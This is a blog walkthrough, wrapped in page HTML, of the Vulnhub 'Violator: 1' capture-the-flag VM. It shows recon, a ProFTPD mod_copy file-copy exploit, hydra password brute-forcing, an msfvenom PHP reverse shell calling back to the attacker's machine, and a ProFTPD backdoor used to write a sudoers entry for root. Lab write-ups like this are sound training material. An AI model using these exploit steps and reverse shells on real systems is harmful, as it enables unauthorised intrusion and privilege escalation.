@@ -1,0 +1,535 @@
+
+
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+<script type="text/javascript">
+    var host = "paul.walko.org";
+    if ((host == window.location.host) && (window.location.protocol != "https:"))
+        window.location.protocol = "https";
+</script>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-79393488-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Walkthrough for Violator: 1 VM on Vulnhub">
+
+<title>Violator: 1, Vulnhub Walkthrough</title>
+
+<!-- favicon -->
+<link rel="apple-touch-icon" sizes="57x57" href="https://paul.walko.org/favicon/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="https://paul.walko.org/favicon/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="https://paul.walko.org/favicon/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="https://paul.walko.org/favicon/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="https://paul.walko.org/favicon/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="https://paul.walko.org/favicon/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="https://paul.walko.org/favicon/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="https://paul.walko.org/favicon/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://paul.walko.org/favicon/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192"  href="https://paul.walko.org/favicon/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://paul.walko.org/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="https://paul.walko.org/favicon/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://paul.walko.org/favicon/favicon-16x16.png">
+<link rel="manifest" href="https://paul.walko.org/favicon/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+
+<link rel="stylesheet" type="text/css" href="https://paul.walko.org/stylesheets/base.css">
+<link rel="stylesheet" type="text/css" href="https://paul.walko.org/stylesheets/simplePagination.css">
+
+<script type="text/javascript" src="https://paul.walko.org/javascripts/jquery.js"></script>
+
+
+
+<link rel="canonical" href=" { { site.url } }{ { page.url } }" />
+
+<!--[if lt IE 9]>
+<script src="https://paul.walko.org/javascripts/html5shiv.js"></script>
+<![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="https://paul.walko.org/stylesheets/markdownreader.css">
+<link rel="stylesheet" type="text/css" href="https://paul.walko.org/stylesheets/pygments_monokai.css">
+<link rel="stylesheet" type="text/css" href="https://paul.walko.org/stylesheets/code_block.css">
+
+</head>
+
+<body>
+    <header id="l-header">
+    <div class="container">
+        <div class="row logo">
+            <div class="col-lg-7">
+                <h1>Paul Walko</h1>
+            </div>
+        </div>
+
+        <div class="row navicon">
+            <a href=""><i class="fa fa-navicon"></i></a>
+        </div>
+
+        <div class="row navbar">
+            <nav class="col-lg-8 col-md-8 col-xs-12">
+                <ul class="row">
+                    <li class="col-lg-3"><a href="https://paul.walko.org/">HOME</a></li>
+                    <li class="col-lg-3">
+                        <ul class="subnav">
+                            <a href="javascript:void(0)">POSTS</a>
+                            <li><a href="https://paul.walko.org/category">CATEGORY</a></li>
+                            <li><a href="https://paul.walko.org/tag">TAG</a></li>
+                        </ul>
+                    </li>
+                    <li class="col-lg-3"><a href="https://paul.walko.org/about">ABOUT</a></li>
+                    <li class="col-lg-3"><a href="https://paul.walko.org/Walko_Paul-Resume.pdf">RÉSUMÉ</a></li>
+                </ul>
+            </nav>
+
+            <div class="search col-lg-4 col-md-4 col-xs-12">
+                <form id="dummySearch">
+                    <label for="search"></label>
+                    <input id="search" name="serach" type="text" placeholder="Not That Dummy Search">
+                    <i class="fa fa-search"></i>
+                </form>
+                <script>
+                $(function(){
+                    $('#dummySearch').submit(function(e) {
+                        e.preventDefault();
+                        keyword = $('#search').val();
+                        url = 'https://www.google.com/search?q=site%3Apaul.walko.org+' + keyword;
+                        location.href = url;
+                    })
+                })
+                </script>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+    <div class="container">
+        <div class="row">
+            <div id="markdown-container" class="col-lg-9">
+                <header>
+                    <p id="postTitle">Violator: 1, Vulnhub Walkthrough</p>
+                    
+                    <ul class="tags clearfix">
+                        
+                        <li><i class="fa fa-tag"></i> vulnhub</li>
+                        
+                        <li><i class="fa fa-tag"></i> hacking</li>
+                        
+                    </ul>
+                    
+                    <p id="postMeta">posted on 08 Jul 2016 under category <a href="https://paul.walko.org/category/">writeup</a></p>
+
+                </header>
+
+                <p>Before I begin, here’s some hints given at the start of the vm:</p>
+
+<ul>
+  <li>Vince Clarke can help you with the Fast Fashion.</li>
+  <li>The challenge isn’t over with root. The flag is something special.</li>
+  <li>I have put a few trolls in, but only to sport with you.</li>
+</ul>
+
+<h1 id="get-the-ip-and-check-for-services">Get the IP and check for services</h1>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>paul@archyoga [04:21:07] [~]
+-&gt; % nmap -sn 192.168.1.0/24 | grep violator
+Nmap scan report for violator (192.168.1.108)
+paul@archyoga [04:21:36] [~]
+-&gt; % nmap -p- -sV 192.168.1.108
+
+Starting Nmap 7.12 ( https://nmap.org ) at 2016-07-09 16:21 EDT
+
+Nmap scan report for violator (192.168.1.108)
+Host is up (0.0086s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     ProFTPD 1.3.5rc3
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+Service Info: OS: Unix
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.49 seconds
+</code></pre>
+</div>
+
+<p>So there’s a website and an proFTPD v1.3.5rc3 server running on the machine. The website just says “I Say.. I say… I say boy! You’re barkin up the wrong tree!” along with Foghorn Leghorn.</p>
+
+<p>However, in the source I found this: <code class="highlighter-rouge">&lt;-- https://en.wikipedia.org/wiki/Violator_(album) --&gt;</code></p>
+
+<p>I found an exploit through <a href="http://exploit-db.com">http://exploit-db.com</a> for proFTPD 1.3.5 (CVE: 2015-3306) that allows you to copy files without logging into the server:</p>
+
+<p>I wasn’t sure what to copy, so I just copied anything I could by copying <code class="highlighter-rouge">/proc/self/root</code> to <code class="highlighter-rouge">/var/www/html/root</code>, this making everything except the root user directory accessible:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>paul@archyoga [04:49:25] [~]
+-&gt; % ftp 192.168.1.108
+Connected to 192.168.1.108.
+220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.108]
+Name (192.168.1.108:paul):
+331 Password required for paul
+Password:
+530 Login incorrect.
+ftp: Login failed.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; site cpfr /proc/self/root
+350 File or directory exists, ready for destination name
+ftp&gt; site cpto /var/www/html/root
+250 Copy successful
+ftp&gt;
+</code></pre>
+</div>
+
+<p>Now you can easily see <code class="highlighter-rouge">/etc/passwd</code>, all the home directories, and <code class="highlighter-rouge">/etc/group</code> to determine what to do next.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>dg:x:1000:1000:Dave Gahan,,,:/home/dg:/bin/bash
+proftpd:x:104:65534::/var/run/proftpd:/bin/false
+ftp:x:105:65534::/srv/ftp:/bin/false
+mg:x:1001:1001:Martin Gore:/home/mg:/bin/bash
+af:x:1002:1002:Andrew Fletcher:/home/af:/bin/bash
+aw:x:1003:1003:Alan Wilder:/home/aw:/bin/bash
+</code></pre>
+</div>
+
+<p>Notice <code class="highlighter-rouge">dg, mg, af, and aw</code>, who are all members of Depeche Mode, which was referenced in an initial hint. I spent quite some time traversing their home directories, however I didn’t have enough information to do anything yet. I found instructions for a Wermache enigma machine and some other hints, but I still needed key. I’ll come back to this part in more detail later.</p>
+
+<h1 id="get-access-to-the-server">Get access to the server</h1>
+
+<p>In <code class="highlighter-rouge">/etc/group</code>, I can see that user <code class="highlighter-rouge">dg</code> is a member of several groups, so let’s try to crack that password:</p>
+
+<p>The only possible solution I have for this is the link to the album for Violator.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>paul@archyoga [06:13:59] [~]
+-&gt; % cewl "https://en.wikipedia.org/wiki/Violator_(album)" -m 6 -w passwords.txt
+CeWL 5.1 Robin Wood (robin@digi.ninja) (http://digi.ninja)
+
+paul@archyoga [06:23:38] [~]
+-&gt; % tr '[:upper:]' '[:lower:]' &lt; passwords.txt &gt; passwords1.txt
+
+paul@archyoga [06:23:40] [~]
+-&gt; % sed -i "s/ //g" passwords1.txt
+
+paul@archyoga [06:23:42] [~]
+-&gt; % hydra -t 1 -l dg -P ./passwords1.txt -vV 192.168.1.108 ftp
+Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+...
+[21][ftp] host: 192.168.1.108 login: dg password: policyoftruth
+[STATUS] attack finished for 192.168.1.108 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+</div>
+
+<p>First I used cewl to generate a password list based on the given url, then removed all the spaces and converted everything to lowercase using <code class="highlighter-rouge">tr</code> and <code class="highlighter-rouge">sed</code>.</p>
+
+<p>Now that I can actually create new files in the server, I generated a reverse php shell and used metasploit to get a shell on the machine:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>paul@archyoga [11:03:11] [~]
+-&gt; % msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=1337 R &gt; exploit.php
+fatal: Not a git repository (or any of the parent directories): .git
+No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+No Arch selected, selecting Arch: php from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 949 bytes
+
+
+paul@archyoga [11:03:15] [~]
+-&gt; % ftp 192.168.1.108                                                                     
+Connected to 192.168.1.108.
+220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.108]
+Name (192.168.1.108:paul): dg
+331 Password required for dg
+Password:
+230 User dg logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; cd /var/www/html/
+250 CWD command successful
+ftp&gt; put exploit.php
+200 PORT command successful
+150 Opening BINARY mode data connection for exploit.php
+226 Transfer complete
+949 bytes sent in 6.8e-05 seconds (13.3 Mbytes/s)
+ftp&gt; 221 Goodbye.
+
+paul@archyoga [11:04:14] [~]
+-&gt; % msfconsole
+
+...
+msf &gt; use exploit/multi/handler
+msf exploit(handler) &gt; set lhost 192.168.1.109
+lhost =&gt; 192.168.1.109
+msf exploit(handler) &gt; set lport 1337
+lport =&gt; 1337
+msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
+payload =&gt; php/meterpreter/reverse_tcp
+msf exploit(handler) &gt; exploit
+
+[*] Started reverse TCP handler on 192.168.1.109:1337
+[*] Starting the payload handler...
+[*] Sending stage (33721 bytes) to 192.168.1.108
+[*] Meterpreter session 1 opened (192.168.1.109:1337 -&gt; 192.168.1.108:43369) at 2016-07-09 23:05:11 -0400
+meterpreter &gt; shell
+Process 1314 created.
+Channel 1 created.
+python -c 'import pty;pty.spawn("/bin/sh")'
+$ su dg
+su dg
+Password: policyoftruth
+
+dg@violator:/var/www/html$
+</code></pre>
+</div>
+
+<p>If you don’t have much experience with metasploit (especially reverse shells), you should probably research that to get used to it.</p>
+
+<h1 id="getting-root">Getting Root</h1>
+
+<p>Now, back to the home directories, if you go to <code class="highlighter-rouge">http://192.168.1.108/root/home</code> there’s 4 directories for each of the 4 suspicious users we saw earlier: <code class="highlighter-rouge">af, aw, dg, mg</code>. The directory for af contains minarke, a terminal based enigma emulator, which is suprisingly difficult to use, aw contains a hint reading <code class="highlighter-rouge">You are getting close... Can you crack the final enigma..?Y</code>, mg contains instructions for a Wermacht enigma machine, and dg contains a very small filesystem with proftpd isntalled.</p>
+
+<p>Running <code class="highlighter-rouge">sudo -l</code> shows that user <code class="highlighter-rouge">dg</code> has permissions to run proftpd in this directory, however it only allows connections from 127.0.0.1. Once I ran it, I found out it is proftpd 1.3.3c.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>dg@violator:/var/www/html$ sudo -l
+sudo -l
+Matching Defaults entries for dg on violator:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User dg may run the following commands on violator:
+    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
+dg@violator:~/bd/sbin$ sudo /home/dg/bd/sbin/proftpd
+sudo /home/dg/bd/sbin/proftpd
+ - setting default address to 127.0.0.1
+localhost - SocketBindTight in effect, ignoring DefaultServer
+dg@violator:/var/www/html$ ftp localhost 2121
+ftp localhost 2121
+ftp: connect to address ::1: Connection refused
+Trying 127.0.0.1...
+Connected to localhost.
+220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]
+</code></pre>
+</div>
+
+<p>Then I added a port forward through metasploit so I could access it on my local machine:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>dg@violator:/var/www/html$ ^C
+Terminate channel 0? [y/N]  N
+[-] core_channel_interact: Operation failed: 1
+meterpreter &gt; portfwd add -L 127.0.0.1 -l 2121 -p 2121 -r 127.0.0.1
+[*] Local TCP relay created: 127.0.0.1:2121 &lt;-&gt; 127.0.0.1:2121
+meterpreter &gt;
+</code></pre>
+</div>
+
+<p>Now you can access the internal proftpd server v1.3.3c from your machine:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>paul@archyoga [01:45:03] [~]
+-&gt; % telnet 127.0.0.1 2121
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]
+user dg
+331 Password required for dg
+pass policyoftruth
+230 User dg logged in
+</code></pre>
+</div>
+
+<p>Now that I have metasploit port forwarding the ftp connection and I’m connected to it, I can use the exploit in proftpd 1.3.3c <a href="https://www.exploit-db.com/exploits/15662/">https://www.exploit-db.com/exploits/15662/</a> with the metasploit module <code class="highlighter-rouge">exploit/unix/ftp/proftpd_133c_backdoor</code> along with the payload <code class="highlighter-rouge">/cmd/unix/generic</code></p>
+
+<p>First in the using the shell I wrote <code class="highlighter-rouge">dg ALL=(ALL:ALL)  ALL</code> to <code class="highlighter-rouge">/tmp/exploit</code> since I’m using that to get root. Then I used the proftpd v1.3.3c exploit to actually copy it to the right directory:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>msf &gt; use exploit/unix/ftp/proftpd_133c_backdoor
+msf exploit(proftpd_133c_backdoor) &gt; set rhost 127.0.0.1
+rhost =&gt; 127.0.0.1
+msf exploit(proftpd_133c_backdoor) &gt; set rport 2121
+rport =&gt; 2121
+msf exploit(proftpd_133c_backdoor) &gt; set payload cmd/unix/generic
+payload =&gt; cmd/unix/generic
+msf exploit(proftpd_133c_backdoor) &gt; set cmd chmod 0440 /tmp/exploit &amp;&amp; cp /tmp/exploit /etc/sudoers.d
+cmd =&gt; chmod 0440 /tmp/exploit &amp;&amp; cp /tmp/exploit /etc/sudoers.d
+msf exploit(proftpd_133c_backdoor) &gt; exploit
+
+[*] 127.0.0.1:2121 - Sending Backdoor Command
+[*] Exploit completed, but no session was created.
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>dg@violator:/var/www/html$ sudo -l
+
+...
+User dg may run the following commands on violator:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
+dg@violator:/var/www/html$ sudo su
+sudo su
+[sudo] password for dg: policyoftruth
+
+root@violator:/var/www/html# cd /root
+cd /root
+root@violator:~# ls
+ls
+flag.txt
+root@violator:~# cat flag.txt
+cat flag.txt
+I say... I say... I say boy! Pumping for oil or something...?
+---Foghorn Leghorn "A Broken Leghorn" 1950 (C) W.B.
+</code></pre>
+</div>
+
+<p>And that get’s us the flag! Now for the <i>final enigma</i>.</p>
+
+<h1 id="the-final-enigma">The Final Enigma</h1>
+
+<p>Within the root folder there’s also a suspicious directory <code class="highlighter-rouge">.basildon</code> containing <code class="highlighter-rouge">crocs.rar</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>root@violator:~# ls -a
+ls -a
+.  ..  .bash_history  .bashrc  .basildon  flag.txt  .profile
+root@violator:~# cd .basildon
+cd .basildon
+root@violator:~/.basildon# ls -a
+ls -a
+.  ..  crocs.rar
+root@violator:~/.basildon# cp crocs.rar /var/www/html/
+cp crocs.rar /var/www/html/
+</code></pre>
+</div>
+
+<p>Back on my local machine, I can see the contents of crocs.rar are password protected</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>paul@archyoga [02:17:20] [~/Downloads]
+-&gt; % unrar e crocs.rar
+
+...
+Enter password (will not be echoed) for artwork.jpg:
+</code></pre>
+</div>
+
+<p>I tried using the password list from eariler, but that didn’t work so I did some googling about crocs and Depeche Mode and found out it is a night club they play at, so I added songs from that to the list and tried it again, and that didn’t work either. I wasn’t sure what else to try, so I regenerated the password list except didn’t take any spaces out or change anything to lowercase, and sure enough it worked!</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>paul@archyoga [02:21:49] [~/Downloads]
+-&gt; % rar2john crocs.rar &gt; myhash
+paul@archyoga [02:25:11] [~/Downloads]
+-&gt; % rar2john myhash --wordlist=~/passwords4.txt   
+Using default input encoding: UTF-8
+Loaded 1 password hash (rar, RAR3 [SHA1 AES 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+World in My Eyes (crocs.rar)
+</code></pre>
+</div>
+
+<p>Inside <code class="highlighter-rouge">crocs.rar</code> there’s just some album artwork, but running exiftool on it reveals a very suspicoius copyright and rights message:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>UKSNRSPYLEWHKOKZARVKDEINRLIBWIUCFQRQKAQQGQ
+LTIUCYMFENULUVFOYQDKPHSUJHFUJSAYJDFGDFRYWK
+LSVNJNVDVSBIBFNIFASOPFDVEYEBQYCOGULLLVQPUW
+ISDBNLNQIJUEZACAKTPPSBBLWRHKZBJMSKLJOACGJM
+FVXZUEKBVWNKWEKVKDMUYFLZEOXCIXIUHJOVSZXFLO
+ZFQTNSKXVWUHJLRAEERYTDPVNZPGUIMXZMESMAMBDV
+KFZSDEIQXYLJNKTBDSRYLDPPOIVUMZDFZPEWPPVHGP
+FBEERMDNHFIWLSHZYKOZVZYNEXGPROHLMRHFEIVIIA
+TOAOJAOVYFVBVIYBGUZXXWFKGJCYEWNQFTPAGLNLHV
+CRDLFHSXHVMCERQTZOOZARBEBWCBCIKUOFQIGZPCMW
+RHJEMUSGYBGWXJENRZHZ
+</code></pre>
+</div>
+
+<p>I’m guessing this is the key for the enigma referenced in the home directories earlier.</p>
+
+<p>Using the instructions from the <code class="highlighter-rouge">mg</code> home folder I decrypted the code using <a href="http://www.dcode.fr/enigma-machine-cipher">http://www.dcode.fr/enigma-machine-cipher</a> since the given minarke emulator was confusing to use.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>Lyrics:
+
+* Use Wermacht with 3 rotors
+* Reflector to B
+Initial: A B C
+Alphabet Ring: C B A
+Plug Board A-B, C-D
+
+</code></pre>
+</div>
+<p><br /></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>ONE FINAL CHALLENGE FOR YOU BGHX CONGRATULATIONS FOR
+THE FOURTH TIME ON SNARFING THE FLAG ON VIOLATOR ILL
+PRESUME BY NOW YOULL KNOW WHAT I WAS LISTENING TO WHEN
+CREATING THIS CTF I HAVE INCLUDED THINGS WHICH WERE
+DELIBERATLY AVOIDING THE OBVIOUS ROUTE IN TO KEEP YOU ON
+YOUR TOES ANOTHER THOUGHT TO PONDER IS THAT BY ABUSING
+PERMISSIONS YOU ARE ALSO BY DEFINITION A VIOLATOR
+SHOUTOUTS AGAIN TO VULNHUB FOR HOSTING A GREAT LEARNING
+TOOL A SPECIAL THANKS GOES TO BENR AND GKNSB FOR TESTING
+AND TO GTMLK FOR THE OFFER TO HOST THE CTF AGAIN
+</code></pre>
+</div>
+
+<p>There you go!</p>
+
+            </div>
+
+            <div id="markdown-outline" class="col-lg-3">
+            </div>
+
+            <div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'paulwalko';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+        </div>
+    </div>
+
+    
+<footer id="l-footer">
+    <div class="container">
+        <div class="row">
+            <div id="contact" class="col-lg-6 col-lg-offset-1 col-md-6 col-md-offset-1 col-sm-9">
+                <h3>CONTACT</h3>
+                <div class="row">
+                    <address id="address" class="col-lg-6 col-md-6 col-sm-6">
+                        United States<br>
+                        Paul Walko<br>
+                    </address>
+
+                    <ul class="col-lg-6 col-md-6 col-sm-6">
+                        <li class="email"><i class="fa fa-envelope"></i> <a href="mailto:paulsw.pw@gmail.com"> &nbsp;&nbsp;paulsw.pw@gmail.com</a></li>
+                        <li class="github"><i class="fa fa-github"></i> <a href="https://www.github.com/paulwalko"> &nbsp;&nbsp;https://www.github.com/paulwalko</a></li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <p id="legal">
+            Copyright (c) 2015 Paul Walko | Powered by <a href="http://jekyllrb.com">Jekyll</a> &amp; <a href="http://github.com">GitHub</a> | designed &amp; built by <a href="http://unifreak.github.io">UniFreak</a>
+        </p>
+    </div>
+</footer>
+
+<script type="text/javascript" src="https://paul.walko.org/javascripts/base.js"></script>
+
+
+    <script type="text/javascript" src="https://paul.walko.org/javascripts/markdownreader.js"></script>
+</body>
+</html>
